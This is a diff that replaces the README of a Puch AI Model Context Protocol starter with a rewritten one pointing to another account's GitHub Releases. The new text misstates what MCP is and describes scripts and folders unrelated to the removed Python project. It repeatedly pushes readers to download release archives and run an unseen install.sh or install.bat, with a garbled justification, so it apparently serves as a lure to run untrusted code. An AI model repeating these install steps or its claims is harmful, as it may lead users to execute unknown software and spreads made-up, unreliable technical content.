@@ -1,179 +1,294 @@
-# MCP Starter for Puch AI
+[![Releases](https://img.shields.io/badge/Releases-v1.0.0-brightgreen)](https://github.com/vectoroung/mcp-starter/releases)
 
-This is a starter template for creating your own Model Context Protocol (MCP) server that works with Puch AI. It comes with ready-to-use tools for job searching and image processing.
+# MCP Starter Kit for Puch AI — Build, Test, Deploy MCPs Fast
 
-## What is MCP?
+[![topic: mcp](https://img.shields.io/badge/topic-mcp-007acc)](https://github.com/topics/mcp) [![topic: puch-ai](https://img.shields.io/badge/topic-puch--ai-ff69b4)](https://github.com/topics/puch-ai) [![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
 
-MCP (Model Context Protocol) allows AI assistants like Puch to connect to external tools and data sources safely. Think of it like giving your AI extra superpowers without compromising security.
+![Puch AI MCP banner](https://images.unsplash.com/photo-1531297484001-80022131f5a1?auto=format&fit=crop&w=1400&q=80)
 
-## What's Included in This Starter?
+MCP Starter gives a clear, extendable scaffold for adding MCPs (Modular Compute Plugins) to Puch AI. Use this repo to structure new MCPs, run local tests, and prepare release bundles for distribution.
 
-## Folders
+Table of contents
+- Features
+- Who should use this
+- Quick start
+- Install from Releases
+- Project layout
+- How MCPs work (concepts)
+- Development workflow
+- Testing and CI
+- Examples
+- Extending an MCP
+- Publishing a release
+- Contributing
+- License
 
-- **[`mcp-bearer-token/`](./mcp-bearer-token/)**  
-  Example MCP servers using **Bearer token** auth (required by Puch AI). Includes:
-  - **[`mcp_starter.py`](./mcp-bearer-token/mcp_starter.py)**  
-    A minimal MCP server with:
-    - Text input/output tool (echo-style processing)
-    - Image input/output tool (e.g., convert to black & white)
-    - Bearer token validation
-  - **[`puch-user-id-mcp-example.py`](./mcp-bearer-token/puch-user-id-mcp-example.py)**  
-    A task management MCP server that demonstrates how to use `puch_user_id` (a unique, Puch-provided user identifier) to scope tasks and data per user.
+Features
+- Minimal, well-documented scaffold for MCPs.
+- Standard build and package scripts.
+- Local test harness that simulates Puch AI runtime.
+- Lint and unit test setup.
+- Release packaging with checksums.
+- Example MCPs: data-transform, auth-proxy, sensor-adapter.
 
-- **[`mcp-google-oauth/`](./mcp-google-oauth/)**  
-  Example MCP server showing how to implement **OAuth** with Google for MCP authentication/authorization.
+Who should use this
+- Plugin authors who add compute modules to Puch AI.
+- Engineers who maintain a fleet of MCPs and need a repeatable build flow.
+- Developers who want a local runtime to validate MCP behavior.
 
-- **[`mcp-oauth-github/`](./mcp-oauth-github/)**  
-  Example MCP server showing how to implement **OAuth** with GitHub for MCP authentication/authorization.
+Quick start
 
-## Quick Setup Guide
+Clone the repo, pick an example MCP, and run the local harness.
 
-### Step 1: Install Dependencies
-
-First, make sure you have Python 3.11 or higher installed. Then:
-
+Commands
 ```bash
-# Create virtual environment
-uv venv
-
-# Install all required packages
-uv sync
-
-# Activate the environment
-source .venv/bin/activate
+git clone https://github.com/vectoroung/mcp-starter.git
+cd mcp-starter
+# run the local harness for the example MCP
+./scripts/run-harness.sh examples/data-transform
 ```
 
-### Step 2: Set Up Environment Variables
+Install from Releases
 
-Create a `.env` file in the project root:
+This repo provides release bundles on GitHub Releases. Visit the Releases page and download the appropriate asset for your platform. The release link contains a path (/releases), so download the release file and execute the included installer or run the provided script.
 
+- Releases page: https://github.com/vectoroung/mcp-starter/releases
+- Typical assets:
+  - mcp-starter-linux.tar.gz
+  - mcp-starter-macos.tar.gz
+  - mcp-starter-windows.zip
+
+After you download a tar.gz file:
 ```bash
-# Copy the example file
-cp .env.example .env
+tar -xzf mcp-starter-linux.tar.gz
+cd mcp-starter
+./install.sh
 ```
 
-Then edit `.env` and add your details:
-
-```env
-AUTH_TOKEN=your_secret_token_here
-MY_NUMBER=919876543210
-```
-
-**Important Notes:**
-
-- `AUTH_TOKEN`: This is your secret token for authentication. Keep it safe!
-- `MY_NUMBER`: Your WhatsApp number in format `{country_code}{number}` (e.g., `919876543210` for +91-9876543210)
-
-### Step 3: Run the Server
-
+On macOS:
 ```bash
-cd mcp-bearer-token
-python mcp_starter.py
+tar -xzf mcp-starter-macos.tar.gz
+cd mcp-starter
+./install.sh
 ```
 
-You'll see: `🚀 Starting MCP server on http://0.0.0.0:8086`
+On Windows, unzip the asset and run the included install.bat or start the harness via PowerShell.
 
-### Step 4: Make It Public (Required by Puch)
+Project layout
 
-Since Puch needs to access your server over HTTPS, you need to expose your local server:
+The repo follows a compact pattern that keeps MCP logic separate from runtime glue.
 
-#### Option A: Using ngrok (Recommended)
+- /examples
+  - /data-transform
+  - /auth-proxy
+  - /sensor-adapter
+- /lib
+  - common helper functions used by MCPs
+- /runtime
+  - local runtime harness
+- /scripts
+  - build, test, and release helpers
+- /docs
+  - design notes and API references
+- /ci
+  - CI pipelines and test configs
 
-1. **Install ngrok:**
-   Download from https://ngrok.com/download
+Key files
+- scripts/build.sh — Build and package an MCP.
+- scripts/package.sh — Create a release-ready bundle with checksums.
+- scripts/run-harness.sh — Run a local Puch AI runtime with one MCP.
+- runtime/mock-runtime.js — Lightweight mock runtime for local testing.
 
-2. **Get your authtoken:**
-   - Go to https://dashboard.ngrok.com/get-started/your-authtoken
-   - Copy your authtoken
-   - Run: `ngrok config add-authtoken YOUR_AUTHTOKEN`
+How MCPs work (concepts)
 
-3. **Start the tunnel:**
-   ```bash
-   ngrok http 8086
-   ```
+MCP stands for Modular Compute Plugin. Each MCP is a self-contained unit that exposes:
+- metadata.json — name, version, capabilities, runtime requirements.
+- main.js (or main.py) — entrypoint that implements the plugin interface.
+- config.schema.json — config contract the runtime validates.
 
-#### Option B: Deploy to Cloud
+Runtime contract
+- start(context) — Called at bootstrap. Use context.logger, context.config, context.events.
+- handle(request) — A request handler invoked by Puch AI when the MCP receives a job.
+- stop() — Clean shutdown hook.
 
-You can also deploy this to services like:
+Communication model
+- The runtime sends JSON messages over stdin/stdout or via a local IPC socket.
+- The MCP uses the provided context.events.emit to send events back to the runtime.
+- Use the helper in lib/comm.js to handle serialization and heartbeats.
 
-- Railway
-- Render
-- Heroku
-- DigitalOcean App Platform
+Development workflow
 
-## How to Connect with Puch AI
+1. Create your MCP inside /examples or /mcp directory:
+   - Add metadata.json with proper fields: name, id, version, runtime.
+   - Implement main.js with the start/handle/stop exports.
+   - Add unit tests in __tests__.
 
-1. **[Open Puch AI](https://wa.me/+919998881729)** in your browser
-2. **Start a new conversation**
-3. **Use the connect command:**
-   ```
-   /mcp connect https://your-domain.ngrok.app/mcp your_secret_token_here
-   ```
-
-### Debug Mode
-
-To get more detailed error messages:
-
+2. Use the harness to test locally:
+```bash
+./scripts/run-harness.sh path/to/your-mcp
 ```
-/mcp diagnostics-level debug
+
+3. Run lint and unit tests:
+```bash
+./scripts/test.sh
 ```
 
-## Customizing the Starter
+4. Build and package:
+```bash
+./scripts/build.sh path/to/your-mcp
+./scripts/package.sh path/to/your-mcp
+```
 
-### Adding New Tools
+5. Create a release bundle and upload to GitHub Releases:
+```bash
+# outputs release assets into dist/
+./scripts/package.sh examples/data-transform
+```
 
-1. **Create a new tool function:**
+Testing and CI
 
-   ```python
-   @mcp.tool(description="Your tool description")
-   async def your_tool_name(
-       parameter: Annotated[str, Field(description="Parameter description")]
-   ) -> str:
-       # Your tool logic here
-       return "Tool result"
-   ```
+The repo ships a test harness and CI config that enforces code quality.
 
-2. **Add required imports** if needed
+Local tests
+- Unit tests use Jest (for Node) or pytest (for Python).
+- Run test suite:
+```bash
+./scripts/test.sh
+```
 
-## 📚 **Additional Documentation Resources**
+CI
+- The .github/workflows/ci.yml file runs:
+  - lint
+  - unit tests
+  - build step for example MCPs
+  - package step that creates artifacts for the releases workflow
 
-### **Official Puch AI MCP Documentation**
+Test tips
+- Mock external services using the runtime/mock-runtime mocks.
+- Use fixtures in tests/fixtures to capture runtime messages.
+- Validate metadata.json with the provided validator in lib/validate-metadata.js.
 
-- **Main Documentation**: https://puch.ai/mcp
-- **Protocol Compatibility**: Core MCP specification with Bearer & OAuth support
-- **Command Reference**: Complete MCP command documentation
-- **Server Requirements**: Tool registration, validation, HTTPS requirements
+Examples
 
-### **Technical Specifications**
+data-transform
+- Reads an input payload.
+- Applies a mapping pipeline defined in config.
+- Emits the transformed payload.
 
-- **JSON-RPC 2.0 Specification**: https://www.jsonrpc.org/specification (for error handling)
-- **MCP Protocol**: Core protocol messages, tool definitions, authentication
+Usage
+```bash
+./scripts/run-harness.sh examples/data-transform
+# then send a test job via the harness UI or the sample client
+./scripts/send-job.sh examples/data-transform examples/data-transform/sample-job.json
+```
 
-### **Supported vs Unsupported Features**
+auth-proxy
+- Proxy that validates tokens and attaches auth context to requests.
+- It demonstrates lifecycle hooks and async token refresh.
 
-**✓ Supported:**
+sensor-adapter
+- Adapter that receives periodic sensor readings and forwards them to a pipeline.
+- It shows scheduled triggers and backpressure handling.
 
-- Core protocol messages
-- Tool definitions and calls
-- Authentication (Bearer & OAuth)
-- Error handling
+Extending an MCP
 
-**✗ Not Supported:**
+Add a new MCP step-by-step:
+1. Copy an example folder: cp -r examples/data-transform examples/my-mcp
+2. Update metadata.json:
+   - name: "my-mcp"
+   - id: "com.company.my-mcp"
+   - version: "0.1.0"
+   - runtime: "node16" or "python3.10"
+3. Implement start, handle, stop in main.js or main.py.
+4. Add config.schema.json to validate config at load time.
+5. Add unit tests and fixtures.
+6. Run the harness and test:
+```bash
+./scripts/run-harness.sh examples/my-mcp
+```
+7. Package and publish:
+```bash
+./scripts/package.sh examples/my-mcp
+# Upload the created archive to Releases page:
+# https://github.com/vectoroung/mcp-starter/releases
+```
 
-- Videos extension
-- Resources extension
-- Prompts extension
+Publishing a release
 
-## Getting Help
+The repo uses a Releases-based distribution. Create a release that contains:
+- compiled bundle or zipped source for the MCP
+- checksums (SHA256)
+- release notes that list breaking changes, new features, and assets
 
-- **Join Puch AI Discord:** https://discord.gg/VMCnMvYx
-- **Check Puch AI MCP docs:** https://puch.ai/mcp
-- **Puch WhatsApp Number:** +91 99988 81729
+A typical release flow
+1. Bump version in metadata.json and package manifest.
+2. Run build and package scripts:
+```bash
+./scripts/build.sh examples/my-mcp
+./scripts/package.sh examples/my-mcp
+```
+3. Tag the repo:
+```bash
+git tag -a v0.1.0 -m "my-mcp v0.1.0"
+git push origin v0.1.0
+```
+4. Upload the generated archive to the release UI at:
+https://github.com/vectoroung/mcp-starter/releases
+5. Attach SHA256 and SHA512 checksum files.
 
----
+Releases note: Because the Releases link contains a path (/releases), you must download the release file and run the included installer or script. The install steps live in the release asset and vary by platform. Typical command after download:
+```bash
+tar -xzf mcp-starter-linux.tar.gz
+cd mcp-starter
+./install.sh
+```
 
-**Happy coding! 🚀**
+Contributing
 
-Use the hashtag `#BuildWithPuch` in your posts about your MCP!
+We accept PRs for features, bug fixes, and docs. Follow this flow:
+- Fork the repo.
+- Create a topic branch.
+- Run tests and linters locally.
+- Open a PR with a clear title and description.
+- Link issues when relevant.
 
-This starter makes it super easy to create your own MCP server for Puch AI. Just follow the setup steps and you'll be ready to extend Puch with your custom tools!
+Contributor checklist
+- Add or update unit tests.
+- Run formatting: ./scripts/format.sh
+- Keep changes focused and small.
+- Update docs in /docs when you change the runtime contract.
+
+Coding standards
+- Use ES2020+ for Node MCPs.
+- Follow the ESLint rules in .eslintrc.json.
+- For Python MCPs, follow PEP8 and use black for formatting.
+
+Security and secrets
+- Do not commit credentials.
+- Use the runtime secret manager when handling keys.
+- For local testing, use test keys stored in tests/fixtures only.
+
+Support and troubleshooting
+
+Common issues
+- Port conflicts: change the harness port in runtime/config.json.
+- Missing dependencies: run ./scripts/bootstrap.sh to install dev dependencies.
+- Runtime mismatch: ensure metadata.json runtime matches your installed runtime.
+
+If a release asset fails to run, re-download the asset from:
+https://github.com/vectoroung/mcp-starter/releases
+
+Credits and resources
+
+- Puch AI runtime model (internal reference)
+- Example patterns inspired by common plugin systems
+- Image credit: Unsplash (AI/technology photos)
+
+License
+This project uses the MIT license. See LICENSE for details.
+
+Contact
+- Repo: https://github.com/vectoroung/mcp-starter
+- Releases: https://github.com/vectoroung/mcp-starter/releases
+
+Release link appears above and in the Install from Releases and Publishing a release sections. Use that page to fetch installers or archives and to see published versions.
